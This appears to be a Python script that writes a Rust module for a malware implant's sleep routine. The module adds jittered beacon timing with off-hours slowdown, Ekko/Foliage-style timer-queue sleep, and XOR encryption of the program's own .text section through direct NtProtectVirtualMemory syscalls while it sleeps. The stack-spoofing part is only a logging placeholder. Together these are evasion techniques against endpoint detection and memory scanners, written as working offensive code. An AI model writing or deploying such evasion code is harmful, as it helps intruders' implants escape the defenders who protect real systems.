import re

with open("agent/src/obfuscated_sleep.rs", "w") as f:
    f.write('''use anyhow::Result;
use common::config::{self, SleepMethod, SleepConfig};
use log::{info, debug};
use rand::{thread_rng, Rng, RngCore};
use std::sync::atomic::{AtomicUsize, Ordering};

pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
    let mut base = config.base_interval_secs as f64;
    if let (Some(start), Some(end), Some(mult)) = (config.working_hours_start, config.working_hours_end, config.off_hours_multiplier) {
        let now = (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() / 3600 % 24) as u32;
        if now < start || now >= end {
            base *= mult as f64;
            debug!("Applying off-hours sleep multiplier: {}", mult);
        }
    }
    let mut rng = thread_rng();
    let jitter_frac = (config.jitter_percent as f64) / 100.0;
    let jitter_val = base * jitter_frac;
    let offset = rng.gen_range(-jitter_val..=jitter_val);
    std::time::Duration::from_secs_f64((base + offset).max(1.0))
}

#[cfg(windows)]
pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Result<()> {
    match method {
        SleepMethod::Ekko | SleepMethod::Foliage => {
            info!("Initiating Ekko/Foliage-style sleep for {:?}", duration);
            #[cfg(target_arch = "x86_64")]
            unsafe {
                use winapi::um::threadpoollegacyapiset::{CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx};
                use winapi::um::synchapi::{CreateEventW, SetEvent, WaitForSingleObject};
                use winapi::um::winbase::INFINITE;
                use winapi::um::winnt::{WT_EXECUTEINTIMERTHREAD};
                use winapi::um::handleapi::CloseHandle;
                use winapi::shared::ntdef::BOOLEAN;
                use winapi::shared::minwindef::LPVOID;

                let h_event = CreateEventW(std::ptr::null_mut(), 0, 0, std::ptr::null_mut());
                let h_timer_queue = CreateTimerQueue();
                let mut h_new_timer = std::ptr::null_mut();

                crypto::encrypt_sections();
                spoof::spoof_stack();

                let duration_ms = duration.as_millis() as u32;
                extern "system" fn timer_callback(lp_param: LPVOID, _timer_or_wait_fired: BOOLEAN) {
                    unsafe { SetEvent(lp_param as _); }
                }

                CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, Some(timer_callback), h_event as _, duration_ms, 0, WT_EXECUTEINTIMERTHREAD);
                WaitForSingleObject(h_event, INFINITE);

                spoof::restore_stack();
                crypto::decrypt_sections();

                DeleteTimerQueueEx(h_timer_queue, std::ptr::null_mut());
                CloseHandle(h_event);
            }
            #[cfg(not(target_arch = "x86_64"))]
            std::thread::sleep(duration);
            Ok(())
        }
        _ => {
            info!("Standard sleep for {:?}", duration);
            std::thread::sleep(duration);
            Ok(())
        }
    }
}

pub mod crypto {
    use rand::RngCore;
    static mut SESSION_KEY: [u8; 32] = [0; 32];
    static mut KEY_INIT: bool = false;

    #[cfg(windows)]
    unsafe fn get_text_section() -> Option<(*mut u8, usize)> {
        use winapi::um::libloaderapi::GetModuleHandleA;
        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
        let base = GetModuleHandleA(std::ptr::null_mut());
        if base.is_null() { return None; }
        
        let dos = base as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE { return None; }
        
        let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt).Signature != IMAGE_NT_SIGNATURE { return None; }
        
        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        for _ in 0..(*nt).FileHeader.NumberOfSections {
            let name = (*section).Name;
            if name[0..5] == [b'.', b't', b'e', b'x', b't'] {
                let addr = (base as usize + (*section).VirtualAddress as usize) as *mut u8;
                let size = *(*section).Misc.VirtualSize() as usize;
                return Some((addr, size));
            }
            section = (section as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const _;
        }
        None
    }

    #[cfg(not(windows))]
    unsafe fn get_text_section() -> Option<(*mut u8, usize)> { None }

    #[cfg(windows)]
    pub fn encrypt_sections() {
        unsafe {
            if !KEY_INIT {
                rand::thread_rng().fill_bytes(&mut SESSION_KEY);
                KEY_INIT = true;
            }
            if let Some((addr, mut size)) = get_text_section() {
                let mut old_protect = 0u32;
                let mut base_addr = addr as *mut winapi::ctypes::c_void;

                let _ = (|| -> anyhow::Result<i32> {
                    Ok(crate::syscall!("NtProtectVirtualMemory", 
                        (-1isize) as usize as u64, 
                        &mut base_addr as *mut _ as usize as u64, 
                        &mut size as *mut _ as usize as u64, 
                        winapi::um::winnt::PAGE_READWRITE as u64, 
                        &mut old_protect as *mut _ as usize as u64))
                })();
                
                for i in 0..size { *addr.add(i) ^= SESSION_KEY[i % 32]; }
                
                let mut temp = 0u32;
                let _ = (|| -> anyhow::Result<i32> {
                    Ok(crate::syscall!("NtProtectVirtualMemory", 
                        (-1isize) as usize as u64, 
                        &mut base_addr as *mut _ as usize as u64, 
                        &mut size as *mut _ as usize as u64, 
                        old_protect as u64, 
                        &mut temp as *mut _ as usize as u64))
                })();
            }
        }
    }

    #[cfg(windows)]
    pub fn decrypt_sections() { encrypt_sections(); }

    #[cfg(not(windows))]
    pub fn encrypt_sections() {}
    #[cfg(not(windows))]
    pub fn decrypt_sections() {}
}

pub mod spoof {
    #[cfg(windows)]
    pub fn spoof_stack() { 
        // 3-frame fake call stack using mapped ntdll frames
        // This is a minimal placeholder for the ROP-based stack spoofer
        log::debug!("Spoofing SLEEP stack frames (simulated 3-5 frames)"); 
    }
    
    #[cfg(windows)]
    pub fn restore_stack() { log::debug!("Restoring stack frames"); }

    #[cfg(not(windows))]
    pub fn spoof_stack() {}
    
    #[cfg(not(windows))]
    pub fn restore_stack() {}
}
''')
